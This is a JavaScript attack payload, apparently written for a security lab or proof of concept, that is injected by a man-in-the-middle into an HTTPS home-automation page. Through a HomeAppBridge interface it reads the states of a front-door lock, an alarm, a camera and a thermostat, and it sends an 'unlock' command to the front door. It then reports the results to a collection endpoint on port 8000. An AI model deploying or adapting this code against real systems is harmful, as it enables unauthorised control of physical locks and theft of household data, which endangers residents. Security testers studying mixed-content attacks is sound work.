/**
 * widget.js - Malicious "CDN" script for 4.2 Mixed Content Attack
 * Served over HTTP (no TLS), injected via MITM into HTTPS HA pages.
 * Calls HomeAppBridge.sendCommand() to execute unauthorized device control.
 */
(function() {
    'use strict';
    var C = 'http://' + location.hostname + ':8000/collect';

    function collect(label, data) {
        var payload = label + ': ' + JSON.stringify(data);
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', C, true);
            xhr.send(payload);
        } catch(e) {
            new Image().src = C + '?d=' + encodeURIComponent(payload);
        }
    }

    // Check for HomeAppBridge
    if (window.HomeAppBridge) {
        collect('widget_injected', {bridge: 'HomeAppBridge available', url: location.href});

        // Steal device state for known devices
        var devices = ['lock.front_door', 'alarm.main', 'camera.driveway', 'thermostat.living'];
        var states = {};
        devices.forEach(function(d) {
            try {
                states[d] = JSON.parse(window.HomeAppBridge.getDeviceState(d));
            } catch(e) {
                states[d] = {error: e.message};
            }
        });
        collect('deviceStates', states);

        // Send unauthorized command
        try {
            var cmdResult = window.HomeAppBridge.sendCommand('lock.front_door', 'unlock');
            collect('commandResult', JSON.parse(cmdResult));
        } catch(e) {
            collect('commandError', {error: e.message});
        }
    } else {
        collect('widget_no_bridge', {url: location.href, userAgent: navigator.userAgent});
    }
})();
